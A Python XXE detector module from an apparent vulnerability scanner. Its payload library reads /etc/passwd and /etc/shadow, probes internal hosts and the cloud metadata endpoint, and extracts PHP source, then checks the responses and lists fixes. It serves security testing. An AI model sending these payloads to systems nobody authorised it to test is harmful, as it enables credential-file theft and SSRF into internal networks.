#!/usr/bin/env python3
"""
XXE (XML External Entity) 检测器

检测 XML 外部实体注入漏洞，包括:
- 文件读取 (file://)
- SSRF (http://)
- 参数实体注入
- 盲 XXE (OOB)
"""

import logging
import re
from typing import Any, Dict, List, Optional

from ..base import BaseDetector, Vulnerability


class XXEDetector(BaseDetector):
    """
    XXE 漏洞检测器

    检测 XML 外部实体注入漏洞，支持多种 XXE 变体检测。
    """

    # XXE 专用测试参数
    DEFAULT_PARAMS = [
        "xml",
        "data",
        "input",
        "content",
        "body",
        "payload",
        "xmldata",
        "xmlinput",
        "request",
        "soap",
    ]

    # 文件读取成功指示符
    FILE_INDICATORS = {
        "linux": ["root:", "daemon:", "bin:", "nobody:", "/bin/bash", "/bin/sh"],
        "windows": ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit app support"],
    }

    # XXE 错误特征
    ERROR_PATTERNS = [
        r"xml\s*parsing\s*error",
        r"xmlparseentityref",
        r"entity\s*.*\s*not\s*defined",
        r"undefined\s*entity",
        r"external\s*entity",
        r"dtd\s*.*\s*error",
        r"invalid\s*xml",
        r"simplexml_load",
        r"domdocument",
        r"saxparseexception",
        r"xmlreader",
        r"lxml\.etree",
        r"elementtree",
    ]

    def get_payloads(self) -> Dict[str, List[str]]:
        """获取 XXE Payload 库"""
        return {
            "file_read_linux": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            ],
            "file_read_windows": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>',
            ],
            "ssrf_internal": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            ],
            "parameter_entity": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini">%xxe;]><foo>test</foo>',
            ],
            "php_filter": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php">]><foo>&xxe;</foo>',
            ],
            "error_based": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_xxe_test_12345">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://invalid.xxe.test.local/dtd">',
            ],
        }

    def validate_response(
        self, response: Dict[str, Any], payload: str, baseline: Dict[str, Any] = None
    ) -> bool:
        """验证响应是否表明存在 XXE 漏洞"""
        if not response.get("success"):
            return False

        text = response.get("response_text", "").lower()

        # 检查文件读取成功指示符
        for os_type, indicators in self.FILE_INDICATORS.items():
            for indicator in indicators:
                if indicator.lower() in text:
                    return True

        # 检查 SSRF 成功指示符
        ssrf_indicators = [
            "ssh-",
            "openssh",
            "ami-id",
            "instance-id",
            "meta-data",
            "redis_version",
            "connected_clients",
            "127.0.0.1",
            "localhost",
        ]
        for indicator in ssrf_indicators:
            if indicator.lower() in text:
                return True

        # 检查 PHP filter base64 输出 (以 PD9 开头的 base64)
        if "pd9" in text or "PD9" in response.get("response_text", ""):
            return True

        # 检查 XXE 错误信息泄露 (可能表明 XML 解析器存在)
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                # 错误信息泄露是较弱的指示符，需要额外验证
                if baseline:
                    baseline_text = baseline.get("response_text", "").lower()
                    if not re.search(pattern, baseline_text, re.IGNORECASE):
                        return True

        return False

    def detect(
        self, url: str, param: Optional[str] = None, deep_scan: bool = False
    ) -> Dict[str, Any]:
        """
        执行 XXE 检测

        XXE 检测主要通过 POST 请求发送 XML 数据
        """
        from tools._common import reset_failure_counter

        reset_failure_counter()

        vulnerabilities = []
        payloads = self.get_payloads()

        # 获取基线响应
        baseline = self.get_baseline(url)

        # XXE 主要通过 POST 请求测试
        headers = {"Content-Type": "application/xml"}

        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                try:
                    response = self.send_request(url, method="POST", data=payload, headers=headers)

                    if response and response.get("success"):
                        if self.validate_response(response, payload, baseline):
                            severity = self._get_severity(payload_type)
                            vuln = Vulnerability(
                                type=f"XXE ({payload_type})",
                                severity=severity,
                                payload=payload[:100] + "..." if len(payload) > 100 else payload,
                                url=url,
                                evidence=self._extract_xxe_evidence(response),
                                verified=False,
                                confidence=0.7,
                                details={"payload_type": payload_type},
                            )
                            vulnerabilities.append(vuln)

                            if not deep_scan:
                                break
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            if vulnerabilities and not deep_scan:
                break

        # 二次验证
        verified_vulns = []
        for vuln in vulnerabilities:
            if self._verify_xxe(url, vuln):
                vuln.verified = True
                vuln.confidence = min(1.0, vuln.confidence + 0.2)
            verified_vulns.append(vuln)

        return {
            "success": True,
            "url": url,
            "detector": "XXEDetector",
            "vulnerabilities": [v.to_dict() for v in verified_vulns],
            "total": len(verified_vulns),
            "verified_count": sum(1 for v in verified_vulns if v.verified),
            "recommendations": self._get_recommendations() if verified_vulns else [],
        }

    def _get_severity(self, payload_type: str) -> str:
        """根据 payload 类型确定严重程度"""
        critical_types = ["file_read_linux", "file_read_windows", "ssrf_internal"]
        high_types = ["parameter_entity", "php_filter"]

        if payload_type in critical_types:
            return "CRITICAL"
        elif payload_type in high_types:
            return "HIGH"
        else:
            return "MEDIUM"

    def _extract_xxe_evidence(self, response: Dict[str, Any]) -> str:
        """提取 XXE 漏洞证据"""
        text = response.get("response_text", "")

        # 查找文件内容片段
        for os_type, indicators in self.FILE_INDICATORS.items():
            for indicator in indicators:
                if indicator.lower() in text.lower():
                    # 提取包含指示符的行
                    for line in text.split("\n"):
                        if indicator.lower() in line.lower():
                            return f"File content leaked: {line[:100]}"

        # 查找 base64 编码内容
        if "PD9" in text or "pd9" in text.lower():
            return "PHP source code leaked (base64 encoded)"

        # 查找错误信息
        for pattern in self.ERROR_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return f"XML parser error: {match.group()}"

        return f"Status: {response.get('status_code')} | Length: {response.get('response_length')}"

    def _verify_xxe(self, url: str, vuln: Vulnerability) -> bool:
        """二次验证 XXE 漏洞"""
        if not vuln.payload:
            return False

        # 使用不同的实体名称重新测试
        modified_payload = vuln.payload.replace("xxe", "xxe_verify")

        try:
            response = self.send_request(
                url,
                method="POST",
                data=modified_payload,
                headers={"Content-Type": "application/xml"},
            )

            if response and response.get("success"):
                return self.validate_response(response, modified_payload)
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        return False

    def _get_recommendations(self) -> List[str]:
        """获取修复建议"""
        return [
            "禁用 XML 外部实体解析 (DTD)",
            "使用安全的 XML 解析器配置",
            "对于 Java: 设置 XMLConstants.FEATURE_SECURE_PROCESSING",
            "对于 PHP: 使用 libxml_disable_entity_loader(true)",
            "对于 Python: 使用 defusedxml 库替代标准 xml 库",
            "实施输入验证，拒绝包含 DOCTYPE 的 XML",
            "使用 JSON 等更安全的数据格式替代 XML",
        ]
